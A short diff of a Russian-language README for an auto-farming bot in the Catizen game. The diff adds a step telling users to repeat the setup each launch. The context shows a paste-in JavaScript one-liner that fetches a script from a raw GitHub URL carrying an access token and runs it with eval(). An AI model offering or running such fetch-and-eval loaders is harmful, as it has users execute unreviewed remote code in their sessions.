@@ -16,3 +16,4 @@
 var unixTime=Date.now(); var url='https://raw.githubusercontent.com/rahavitski/cats-stuff/main/Catizen-script-v1.1.js?token=GHSAT0AAAAAACQ2I2QLSVBWQ7COEMC4HVFMZQ643GA'+'?'+unixTime; fetch(url).then(response=>response.text()).then(script=>eval(script));
 ```
 #### 9. Подождите пару секунд, переходите в игру, включайте Автобота и фармите $CATS!
+#### 10. Теперь каждый раз при запуске игры необходимо повторять шаги с 5 по 9, чтобы активировать Автобота.
